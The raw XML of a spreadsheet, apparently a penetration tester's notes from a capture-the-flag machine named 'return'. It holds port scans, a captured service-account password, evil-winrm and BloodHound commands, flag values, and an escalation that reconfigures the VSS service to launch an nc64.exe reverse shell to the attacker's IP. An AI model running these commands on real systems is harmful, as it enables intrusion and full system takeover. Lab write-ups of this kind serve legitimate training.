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13_ncr:1_{EA8D435F-7AAF-4383-BCE4-6E16A26B7DAA}" xr6:coauthVersionLast="47" xr6:coauthVersionMax="47" xr10:uidLastSave="{00000000-0000-0000-0000-000000000000}"/>
  <bookViews>
    <workbookView xWindow="-135" yWindow="-16335" windowWidth="29070" windowHeight="15750" activeTab="3" xr2:uid="{9AA4AFCA-69F3-4FD9-877C-89FBB0C8B483}"/>
  </bookViews>
  <sheets>
    <sheet name="Network" sheetId="1" r:id="rId1"/>
    <sheet name="Web App" sheetId="3" r:id="rId2"/>
    <sheet name="On host" sheetId="4" r:id="rId3"/>
    <sheet name="Commands" sheetId="2" r:id="rId4"/>
    <sheet name="Misc" sheetId="5" r:id="rId5"/>
    <sheet name="Reverse Engineering" sheetId="6" r:id="rId6"/>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7" i="1" l="1"/>
  <c r="F8" i="1"/>
  <c r="F9" i="1"/>
  <c r="F10" i="1"/>
  <c r="F11" i="1"/>
  <c r="F12" i="1"/>
  <c r="F13" i="1"/>
  <c r="F14" i="1"/>
  <c r="F15" i="1"/>
  <c r="F16" i="1"/>
  <c r="F17" i="1"/>
  <c r="F18" i="1"/>
  <c r="F19" i="1"/>
  <c r="F20" i="1"/>
  <c r="F21" i="1"/>
  <c r="F22" i="1"/>
  <c r="F23" i="1"/>
  <c r="F24" i="1"/>
  <c r="F25" i="1"/>
  <c r="F27" i="1"/>
  <c r="F28" i="1"/>
  <c r="F29" i="1"/>
  <c r="F30" i="1"/>
  <c r="F26" i="1"/>
  <c r="E7" i="1"/>
  <c r="E8" i="1"/>
  <c r="E9" i="1"/>
  <c r="E10" i="1"/>
  <c r="E11" i="1"/>
  <c r="E12" i="1"/>
  <c r="E13" i="1"/>
  <c r="E14" i="1"/>
  <c r="E15" i="1"/>
  <c r="E16" i="1"/>
  <c r="E17" i="1"/>
  <c r="E18" i="1"/>
  <c r="E19" i="1"/>
  <c r="E20" i="1"/>
  <c r="E21" i="1"/>
  <c r="E22" i="1"/>
  <c r="E23" i="1"/>
  <c r="E24" i="1"/>
  <c r="E25" i="1"/>
  <c r="E27" i="1"/>
  <c r="E28" i="1"/>
  <c r="E29" i="1"/>
  <c r="E30" i="1"/>
  <c r="E26" i="1"/>
  <c r="E5" i="1"/>
  <c r="E4" i="1"/>
  <c r="F4" i="1"/>
  <c r="F5" i="1"/>
  <c r="E6" i="1"/>
  <c r="F6" i="1"/>
  <c r="F3" i="1"/>
  <c r="E3" i="1"/>
  <c r="E2" i="1"/>
  <c r="F2" i="1"/>
</calcChain>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="154" uniqueCount="110">
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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cat hosts /etc/hosts | sudo tee /etc/hosts | head -1</t>
  </si>
  <si>
    <t>Task</t>
  </si>
  <si>
    <t>App</t>
  </si>
  <si>
    <t>Sub task</t>
  </si>
  <si>
    <t>Resource</t>
  </si>
  <si>
    <t>53/tcp</t>
  </si>
  <si>
    <t>80/tcp</t>
  </si>
  <si>
    <t>88/tcp</t>
  </si>
  <si>
    <t>135/tcp</t>
  </si>
  <si>
    <t>139/tcp</t>
  </si>
  <si>
    <t>389/tcp</t>
  </si>
  <si>
    <t>445/tcp</t>
  </si>
  <si>
    <t>464/tcp</t>
  </si>
  <si>
    <t>593/tcp</t>
  </si>
  <si>
    <t>636/tcp</t>
  </si>
  <si>
    <t>3268/tcp</t>
  </si>
  <si>
    <t>3269/tcp</t>
  </si>
  <si>
    <t>5985/tcp</t>
  </si>
  <si>
    <t>9389/tcp</t>
  </si>
  <si>
    <t>47001/tcp</t>
  </si>
  <si>
    <t>49664/tcp</t>
  </si>
  <si>
    <t>49665/tcp</t>
  </si>
  <si>
    <t>49666/tcp</t>
  </si>
  <si>
    <t>49667/tcp</t>
  </si>
  <si>
    <t>49674/tcp</t>
  </si>
  <si>
    <t>49675/tcp</t>
  </si>
  <si>
    <t>49677/tcp</t>
  </si>
  <si>
    <t>49680/tcp</t>
  </si>
  <si>
    <t>49697/tcp</t>
  </si>
  <si>
    <t>53002/udp</t>
  </si>
  <si>
    <t>53478/udp</t>
  </si>
  <si>
    <t>53749/udp</t>
  </si>
  <si>
    <t>54294/udp</t>
  </si>
  <si>
    <t>63931/tcp</t>
  </si>
  <si>
    <t>53/tcp    open   domain        Simple DNS Plus</t>
  </si>
  <si>
    <t>80/tcp    open   http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE</t>
  </si>
  <si>
    <t>88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-28 11:36:46Z)</t>
  </si>
  <si>
    <t>135/tcp   open   msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn</t>
  </si>
  <si>
    <t>389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)</t>
  </si>
  <si>
    <t>445/tcp   open   microsoft-ds?</t>
  </si>
  <si>
    <t>464/tcp   open   kpasswd5?</t>
  </si>
  <si>
    <t>593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0</t>
  </si>
  <si>
    <t>636/tcp   open   tcpwrapped</t>
  </si>
  <si>
    <t>3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)</t>
  </si>
  <si>
    <t>3269/tcp  open   tcpwrapped</t>
  </si>
  <si>
    <t>5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0</t>
  </si>
  <si>
    <t>9389/tcp  open   mc-nmf        .NET Message Framing</t>
  </si>
  <si>
    <t>47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0</t>
  </si>
  <si>
    <t>49664/tcp open   msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49665/tcp open   msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49666/tcp open   msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49667/tcp open   msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49674/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0</t>
  </si>
  <si>
    <t>49675/tcp open   msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49677/tcp open   msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49680/tcp open   msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49697/tcp open   msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>63931/tcp open   msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>Printer panel</t>
  </si>
  <si>
    <t>/</t>
  </si>
  <si>
    <t>/settings.php</t>
  </si>
  <si>
    <t>Very interesting. You can change the IP to be your own to pull the password via the post request.</t>
  </si>
  <si>
    <t>Password: 1edFg43012!!</t>
  </si>
  <si>
    <t>return\svc-printer</t>
  </si>
  <si>
    <t>user.txt: 10992779d17926f23d4986c1357aa163</t>
  </si>
  <si>
    <t>tree /f .</t>
  </si>
  <si>
    <t>GROUP INFORMATION
-----------------
Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled</t>
    </r>
  </si>
  <si>
    <t>[Environment]::Is64BitOperatingSystem</t>
  </si>
  <si>
    <t>upload ../tools/winPEASx64.exe</t>
  </si>
  <si>
    <t>sudo ntpdate return.local</t>
  </si>
  <si>
    <t>upload ../tools/nc64.exe</t>
  </si>
  <si>
    <t>sc.exe start VSS</t>
  </si>
  <si>
    <t>nt authority\system</t>
  </si>
  <si>
    <t>root.txt: 6a648c86e9586e04e0ec08db66fda611</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">I think this is the route. Saving for next time.
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Close but because we're part of the server operators group we can modify services. We will modify the VSS service so that we can execute our own binary under the context of system.</t>
    </r>
  </si>
  <si>
    <t>[victim IP]</t>
  </si>
  <si>
    <t>http://[victim IP]/</t>
  </si>
  <si>
    <t>sudo masscan -pT:1-65535,U:1-65535 --rate=1000 -e tun0 [victim IP] &gt; raw_ports.txt</t>
  </si>
  <si>
    <t>sudo nmap -p$(cat raw_ports.txt | cut -d ' ' -f 4 | cut -d '/' -f 1 | sort -un | tr '\n' ',' | sed 's/,$//') -sS -sV --version-all -sC -O -T3 -v [victim IP]</t>
  </si>
  <si>
    <t>netexec smb [victim IP] --generate-hosts-file hosts</t>
  </si>
  <si>
    <t>netexec smb [victim IP]  -u '' -p '' --shares</t>
  </si>
  <si>
    <t>evil-winrm -i [victim IP] -u svc-printer -p '1edFg43012!!'</t>
  </si>
  <si>
    <t>GetNPUsers.py return.local/svc-printer -dc-ip [victim IP] -request -format john -no-pass</t>
  </si>
  <si>
    <t xml:space="preserve">bloodhound-ce-python -u svc-printer -p '1edFg43012!!' -d return.local -ns [victim IP] -c All --zip </t>
  </si>
  <si>
    <t>sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\programdata\nc64.exe -e cmd [attack IP] 4444"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</si>
</sst>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2">
    <dxf>
      <fill>
        <patternFill>
          <bgColor theme="6" tint="0.39994506668294322"/>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30"/>
  <sheetViews>
    <sheetView zoomScale="75" zoomScaleNormal="75" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="E1" sqref="E1"/>
      <selection pane="bottomLeft" activeCell="H25" sqref="H25"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="15.77734375" defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="18.6640625" style="2" customWidth="1"/>
    <col min="2" max="3" width="15.77734375" style="2"/>
    <col min="4" max="4" width="17.88671875" style="2" customWidth="1"/>
    <col min="5" max="5" width="17.6640625" style="2" customWidth="1"/>
    <col min="6" max="6" width="17.109375" style="2" customWidth="1"/>
    <col min="7" max="7" width="23.5546875" style="2" customWidth="1"/>
    <col min="8" max="8" width="35.44140625" style="2" customWidth="1"/>
    <col min="9" max="9" width="23.44140625" style="2" customWidth="1"/>
    <col min="10" max="10" width="36.6640625" style="2" customWidth="1"/>
    <col min="11" max="11" width="36.88671875" style="2" customWidth="1"/>
    <col min="12" max="16384" width="15.777343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2" t="s">
        <v>100</v>
      </c>
      <c r="D2" s="2" t="s">
        <v>28</v>
      </c>
      <c r="E2" s="7" t="str">
        <f t="shared" ref="E2:E30" si="0">LEFT($D2,FIND("/",$D2)-1)</f>
        <v>53</v>
      </c>
      <c r="F2" s="6" t="str">
        <f t="shared" ref="F2:F30" si="1">MID($D2,FIND("/",$D2)+1,LEN($D2))</f>
        <v>tcp</v>
      </c>
      <c r="G2" s="2" t="s">
        <v>57</v>
      </c>
    </row>
    <row r="3" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" t="s">
        <v>100</v>
      </c>
      <c r="B3" s="1"/>
      <c r="D3" s="2" t="s">
        <v>29</v>
      </c>
      <c r="E3" s="7" t="str">
        <f t="shared" si="0"/>
        <v>80</v>
      </c>
      <c r="F3" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G3" s="2" t="s">
        <v>58</v>
      </c>
      <c r="J3" s="5"/>
    </row>
    <row r="4" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="2" t="s">
        <v>100</v>
      </c>
      <c r="D4" s="2" t="s">
        <v>30</v>
      </c>
      <c r="E4" s="7" t="str">
        <f t="shared" si="0"/>
        <v>88</v>
      </c>
      <c r="F4" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G4" s="2" t="s">
        <v>59</v>
      </c>
      <c r="I4" s="4"/>
      <c r="J4" s="5"/>
    </row>
    <row r="5" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" t="s">
        <v>100</v>
      </c>
      <c r="B5" s="1"/>
      <c r="D5" s="2" t="s">
        <v>31</v>
      </c>
      <c r="E5" s="7" t="str">
        <f t="shared" si="0"/>
        <v>135</v>
      </c>
      <c r="F5" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G5" s="2" t="s">
        <v>60</v>
      </c>
      <c r="I5" s="4"/>
      <c r="J5" s="5"/>
    </row>
    <row r="6" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A6" s="2" t="s">
        <v>100</v>
      </c>
      <c r="D6" s="2" t="s">
        <v>32</v>
      </c>
      <c r="E6" s="7" t="str">
        <f t="shared" si="0"/>
        <v>139</v>
      </c>
      <c r="F6" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G6" s="2" t="s">
        <v>61</v>
      </c>
      <c r="J6" s="5"/>
    </row>
    <row r="7" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A7" t="s">
        <v>100</v>
      </c>
      <c r="D7" s="2" t="s">
        <v>33</v>
      </c>
      <c r="E7" s="7" t="str">
        <f t="shared" si="0"/>
        <v>389</v>
      </c>
      <c r="F7" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G7" s="2" t="s">
        <v>62</v>
      </c>
    </row>
    <row r="8" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A8" s="2" t="s">
        <v>100</v>
      </c>
      <c r="D8" s="2" t="s">
        <v>34</v>
      </c>
      <c r="E8" s="7" t="str">
        <f t="shared" si="0"/>
        <v>445</v>
      </c>
      <c r="F8" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G8" s="2" t="s">
        <v>63</v>
      </c>
    </row>
    <row r="9" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A9" t="s">
        <v>100</v>
      </c>
      <c r="D9" s="2" t="s">
        <v>35</v>
      </c>
      <c r="E9" s="7" t="str">
        <f t="shared" si="0"/>
        <v>464</v>
      </c>
      <c r="F9" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G9" s="2" t="s">
        <v>64</v>
      </c>
      <c r="I9" s="4"/>
      <c r="J9" s="5"/>
    </row>
    <row r="10" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A10" s="2" t="s">
        <v>100</v>
      </c>
      <c r="D10" s="2" t="s">
        <v>36</v>
      </c>
      <c r="E10" s="7" t="str">
        <f t="shared" si="0"/>
        <v>593</v>
      </c>
      <c r="F10" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G10" s="2" t="s">
        <v>65</v>
      </c>
    </row>
    <row r="11" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A11" t="s">
        <v>100</v>
      </c>
      <c r="D11" s="2" t="s">
        <v>37</v>
      </c>
      <c r="E11" s="7" t="str">
        <f t="shared" si="0"/>
        <v>636</v>
      </c>
      <c r="F11" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G11" s="2" t="s">
        <v>66</v>
      </c>
    </row>
    <row r="12" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A12" s="2" t="s">
        <v>100</v>
      </c>
      <c r="D12" s="2" t="s">
        <v>38</v>
      </c>
      <c r="E12" s="7" t="str">
        <f t="shared" si="0"/>
        <v>3268</v>
      </c>
      <c r="F12" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G12" s="2" t="s">
        <v>67</v>
      </c>
    </row>
    <row r="13" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A13" t="s">
        <v>100</v>
      </c>
      <c r="D13" s="2" t="s">
        <v>39</v>
      </c>
      <c r="E13" s="7" t="str">
        <f t="shared" si="0"/>
        <v>3269</v>
      </c>
      <c r="F13" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G13" s="2" t="s">
        <v>68</v>
      </c>
    </row>
    <row r="14" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A14" s="2" t="s">
        <v>100</v>
      </c>
      <c r="D14" s="2" t="s">
        <v>40</v>
      </c>
      <c r="E14" s="7" t="str">
        <f t="shared" si="0"/>
        <v>5985</v>
      </c>
      <c r="F14" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G14" s="2" t="s">
        <v>69</v>
      </c>
    </row>
    <row r="15" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A15" t="s">
        <v>100</v>
      </c>
      <c r="D15" s="2" t="s">
        <v>41</v>
      </c>
      <c r="E15" s="7" t="str">
        <f t="shared" si="0"/>
        <v>9389</v>
      </c>
      <c r="F15" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G15" s="2" t="s">
        <v>70</v>
      </c>
    </row>
    <row r="16" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A16" s="2" t="s">
        <v>100</v>
      </c>
      <c r="D16" s="2" t="s">
        <v>42</v>
      </c>
      <c r="E16" s="7" t="str">
        <f t="shared" si="0"/>
        <v>47001</v>
      </c>
      <c r="F16" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G16" s="2" t="s">
        <v>71</v>
      </c>
    </row>
    <row r="17" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A17" t="s">
        <v>100</v>
      </c>
      <c r="D17" s="2" t="s">
        <v>43</v>
      </c>
      <c r="E17" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49664</v>
      </c>
      <c r="F17" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G17" s="2" t="s">
        <v>72</v>
      </c>
    </row>
    <row r="18" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A18" s="2" t="s">
        <v>100</v>
      </c>
      <c r="D18" s="2" t="s">
        <v>44</v>
      </c>
      <c r="E18" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49665</v>
      </c>
      <c r="F18" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G18" s="2" t="s">
        <v>73</v>
      </c>
    </row>
    <row r="19" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A19" t="s">
        <v>100</v>
      </c>
      <c r="D19" s="2" t="s">
        <v>45</v>
      </c>
      <c r="E19" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49666</v>
      </c>
      <c r="F19" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G19" s="2" t="s">
        <v>74</v>
      </c>
    </row>
    <row r="20" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A20" s="2" t="s">
        <v>100</v>
      </c>
      <c r="D20" s="2" t="s">
        <v>46</v>
      </c>
      <c r="E20" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49667</v>
      </c>
      <c r="F20" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G20" s="2" t="s">
        <v>75</v>
      </c>
    </row>
    <row r="21" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A21" t="s">
        <v>100</v>
      </c>
      <c r="D21" s="2" t="s">
        <v>47</v>
      </c>
      <c r="E21" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49674</v>
      </c>
      <c r="F21" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G21" s="2" t="s">
        <v>76</v>
      </c>
    </row>
    <row r="22" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A22" s="2" t="s">
        <v>100</v>
      </c>
      <c r="D22" s="2" t="s">
        <v>48</v>
      </c>
      <c r="E22" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49675</v>
      </c>
      <c r="F22" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G22" s="2" t="s">
        <v>77</v>
      </c>
    </row>
    <row r="23" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A23" t="s">
        <v>100</v>
      </c>
      <c r="D23" s="2" t="s">
        <v>49</v>
      </c>
      <c r="E23" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49677</v>
      </c>
      <c r="F23" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G23" s="2" t="s">
        <v>78</v>
      </c>
    </row>
    <row r="24" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A24" s="2" t="s">
        <v>100</v>
      </c>
      <c r="D24" s="2" t="s">
        <v>50</v>
      </c>
      <c r="E24" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49680</v>
      </c>
      <c r="F24" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G24" s="2" t="s">
        <v>79</v>
      </c>
    </row>
    <row r="25" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A25" t="s">
        <v>100</v>
      </c>
      <c r="D25" s="2" t="s">
        <v>51</v>
      </c>
      <c r="E25" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49697</v>
      </c>
      <c r="F25" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G25" s="2" t="s">
        <v>80</v>
      </c>
    </row>
    <row r="26" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A26" s="2" t="s">
        <v>100</v>
      </c>
      <c r="D26" s="2" t="s">
        <v>56</v>
      </c>
      <c r="E26" s="7" t="str">
        <f t="shared" si="0"/>
        <v>63931</v>
      </c>
      <c r="F26" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G26" s="2" t="s">
        <v>81</v>
      </c>
    </row>
    <row r="27" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A27" s="2" t="s">
        <v>100</v>
      </c>
      <c r="D27" s="2" t="s">
        <v>52</v>
      </c>
      <c r="E27" s="7" t="str">
        <f t="shared" si="0"/>
        <v>53002</v>
      </c>
      <c r="F27" s="6" t="str">
        <f t="shared" si="1"/>
        <v>udp</v>
      </c>
    </row>
    <row r="28" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A28" t="s">
        <v>100</v>
      </c>
      <c r="D28" s="2" t="s">
        <v>53</v>
      </c>
      <c r="E28" s="7" t="str">
        <f t="shared" si="0"/>
        <v>53478</v>
      </c>
      <c r="F28" s="6" t="str">
        <f t="shared" si="1"/>
        <v>udp</v>
      </c>
    </row>
    <row r="29" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A29" s="2" t="s">
        <v>100</v>
      </c>
      <c r="D29" s="2" t="s">
        <v>54</v>
      </c>
      <c r="E29" s="7" t="str">
        <f t="shared" si="0"/>
        <v>53749</v>
      </c>
      <c r="F29" s="6" t="str">
        <f t="shared" si="1"/>
        <v>udp</v>
      </c>
    </row>
    <row r="30" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A30" t="s">
        <v>100</v>
      </c>
      <c r="D30" s="2" t="s">
        <v>55</v>
      </c>
      <c r="E30" s="7" t="str">
        <f t="shared" si="0"/>
        <v>54294</v>
      </c>
      <c r="F30" s="6" t="str">
        <f t="shared" si="1"/>
        <v>udp</v>
      </c>
    </row>
  </sheetData>
  <sortState xmlns:xlrd2="http://schemas.microsoft.com/office/spreadsheetml/2017/richdata2" ref="A2:K30">
    <sortCondition ref="F2:F30"/>
    <sortCondition ref="E2:E30"/>
  </sortState>
  <phoneticPr fontId="3" type="noConversion"/>
  <conditionalFormatting sqref="F2:F30">
    <cfRule type="cellIs" dxfId="1" priority="1" operator="equal">
      <formula>"udp"</formula>
    </cfRule>
    <cfRule type="cellIs" dxfId="0" priority="2" operator="equal">
      <formula>"tcp"</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I22"/>
  <sheetViews>
    <sheetView zoomScale="78" zoomScaleNormal="78" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="C1" sqref="C1"/>
      <selection pane="bottomLeft" activeCell="G3" sqref="G3"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="15.77734375" defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="38.44140625" style="2" bestFit="1" customWidth="1"/>
    <col min="2" max="2" width="13.109375" style="2" customWidth="1"/>
    <col min="3" max="4" width="15.77734375" style="2"/>
    <col min="5" max="5" width="39.5546875" style="2" customWidth="1"/>
    <col min="6" max="6" width="107.6640625" style="2" customWidth="1"/>
    <col min="7" max="7" width="26.33203125" style="2" customWidth="1"/>
    <col min="8" max="8" width="15.77734375" style="2"/>
    <col min="9" max="9" width="45.5546875" style="2" customWidth="1"/>
    <col min="10" max="16384" width="15.77734375" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:9" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>7</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>2</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>17</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>16</v>
      </c>
      <c r="E1" s="4" t="s">
        <v>8</v>
      </c>
      <c r="F1" s="4" t="s">
        <v>5</v>
      </c>
      <c r="G1" s="4" t="s">
        <v>21</v>
      </c>
      <c r="H1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="I1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="1" t="s">
        <v>101</v>
      </c>
      <c r="E2" s="2" t="s">
        <v>83</v>
      </c>
      <c r="F2" s="2" t="s">
        <v>82</v>
      </c>
    </row>
    <row r="3" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="1" t="s">
        <v>101</v>
      </c>
      <c r="E3" s="2" t="s">
        <v>84</v>
      </c>
      <c r="F3" s="2" t="s">
        <v>85</v>
      </c>
      <c r="G3" s="4" t="s">
        <v>86</v>
      </c>
      <c r="H3" s="5"/>
    </row>
    <row r="4" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
